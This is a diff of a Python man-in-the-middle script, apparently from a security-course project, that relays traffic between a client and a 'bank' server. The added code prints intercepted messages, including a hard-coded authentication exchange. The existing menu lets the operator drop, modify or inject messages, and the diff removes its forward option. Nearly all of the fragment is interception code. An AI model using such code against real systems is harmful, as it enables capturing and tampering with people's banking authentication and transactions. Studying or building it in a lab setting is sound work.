@@ -23,10 +23,43 @@ def handle_mitm(client_socket, args):
     print(data)
     bank_sock = socket(AF_INET, SOCK_STREAM)
     bank_sock.connect((args.s, args.q))
+    bank_sock.send(data)
+    data = client_socket.recv(1024)
+    print("Received data from client:")
+    print(data)
+    bank_sock.send(data)
+    data = bank_sock.recv(1024)
+    print("Received data from bank:")
+    print(data)
+    client_socket.send(data)
+    data = client_socket.recv(1024)
+    bank_sock.send(data)
+    #AUTENTICAÇÃO
+    data = client_socket.recv(1024)
+    print("Received data from client:")
+    print(data)
+    bank_sock.send(data)
+    data = bank_sock.recv(1024)
+    print("Received data from bank:")
+    print(data)
+    client_socket.send(data)
+    data = bank_sock.recv(1024)
+    print("Received data from bank:")
+    print(data)
+    client_socket.send(data)
+    data = client_socket.recv(1024)
+    print("Received data from client:")
+    print(data)
+    bank_sock.send(data)
+    data = bank_sock.recv(1024)
+    print("Received data from bank:")
+    print(data)
+    client_socket.send(data)
+
+
     while True:
         val = input("\nWhat do you want to do?"
                     "\n(D)rop"
-                    "\n(F)orward"
                     "\n(M)odify"
                     "\n(Rc)eceive Client"
                     "\n(Rb)eceive Bank"
@@ -45,16 +78,10 @@ def handle_mitm(client_socket, args):
             print("Received data from bank:")
             print(data)
 
-        if val == "f":
-
-            bank_sock.send(data)
-
-
         if val == "sc":
             client_socket.send(data)
 
         if val == "sb":
-
             bank_sock.send(data)
 
 
